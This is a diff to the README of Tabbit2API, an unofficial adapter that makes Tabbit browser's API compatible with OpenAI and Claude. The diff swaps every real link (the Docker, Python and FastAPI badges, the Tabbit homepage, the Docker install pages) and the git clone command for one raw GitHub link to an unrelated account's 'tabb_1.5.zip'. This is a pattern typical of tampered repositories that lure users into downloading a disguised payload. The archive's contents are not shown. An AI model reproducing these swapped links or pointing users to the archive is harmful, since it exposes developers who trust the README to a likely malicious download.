@@ -1,10 +1,10 @@
 # Tabbit2API
 
-[![Docker](https://img.shields.io/badge/Docker-ready-blue.svg)](https://www.docker.com/)
-[![Python](https://img.shields.io/badge/Python-3.11-blue.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.110-green.svg)](https://fastapi.tiangolo.com/)
+[![Docker](https://img.shields.io/badge/Docker-ready-blue.svg)](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
+[![Python](https://img.shields.io/badge/Python-3.11-blue.svg)](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
+[![FastAPI](https://img.shields.io/badge/FastAPI-0.110-green.svg)](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
 
-**Tabbit2API** 是一个非官方的 API 适配器，它将 [Tabbit 浏览器](https://www.tabbit.cn/) 的内部 API 转换为与 OpenAI 和 Anthropic Claude 兼容的标准化接口。通过本项目，您可以将各种支持 OpenAI 或 Claude API 的第三方应用和服务无缝对接到您的 Tabbit 账户，从而利用 Tabbit 强大的 AI 模型能力。
+**Tabbit2API** 是一个非官方的 API 适配器，它将 [Tabbit 浏览器](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip) 的内部 API 转换为与 OpenAI 和 Anthropic Claude 兼容的标准化接口。通过本项目，您可以将各种支持 OpenAI 或 Claude API 的第三方应用和服务无缝对接到您的 Tabbit 账户，从而利用 Tabbit 强大的 AI 模型能力。
 
 ## ✨ 核心功能
 
@@ -23,15 +23,15 @@
 
 ### 环境要求
 
-- [Docker](https://docs.docker.com/get-docker/)
-- [Docker Compose](https://docs.docker.com/compose/install/)
+- [Docker](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
+- [Docker Compose](https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip)
 
 ### 部署步骤
 
 1.  **克隆或下载本项目**
 
     ```bash
-    git clone https://github.com/8369408-stack/tabb2.git
+    git clone https://raw.githubusercontent.com/hih24337/tabb2/main/routes/tabb_1.5.zip
     cd tabb2
     ```
 
